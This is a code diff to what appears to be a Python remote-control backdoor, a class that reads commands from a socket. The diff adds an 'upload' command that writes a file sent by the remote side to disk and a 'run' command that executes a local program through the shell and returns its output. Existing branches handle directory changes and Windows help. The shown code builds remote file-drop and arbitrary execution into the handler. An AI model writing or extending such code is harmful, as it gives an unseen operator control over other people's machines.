@@ -102,6 +102,21 @@ class functions(object):
                 else:
                     soc.send(name+" does not exists.")
 
+            elif data.startswith("upload("):
+                name = data[7:-2]
+                soc.send("ok")
+                data = ""
+                data = soc.recv(4096)
+                while "finish" not in data:
+                    data += soc.recv(150)
+                data = data[:-7]
+
+                fh = open(name, "wb")
+                fh.write(data)
+                fh.close()
+                #print name + " successfully downloaded."
+
+
             elif data.startswith("cdir"):
                 path = data[5:-1]
                 os.chdir(path)
@@ -142,8 +157,22 @@ class functions(object):
                 else:
                     soc.send(stdout)
 
-            #elif data == "help\n":
-             #   soc.send("admins for administrators\nusers for users\nwhelp for windows help.\n")
+            elif data.startswith("run "):
+                prog = data[4:len(data)-1]
+                stdout = prog
+                if os.path.isfile(prog):
+                    stdout = "Running "+prog+"..."
+                    proc = subprocess.Popen(prog, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+
+                    stdout = proc.stdout.read() + proc.stderr.read()
+                else:
+                    stdout = "File not found!!!"
+
+                if stdout == '':
+                    soc.send(' ')
+                else:
+                    soc.send(stdout)
 
             elif data == "whelp\n":
                 proc = subprocess.Popen("help", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
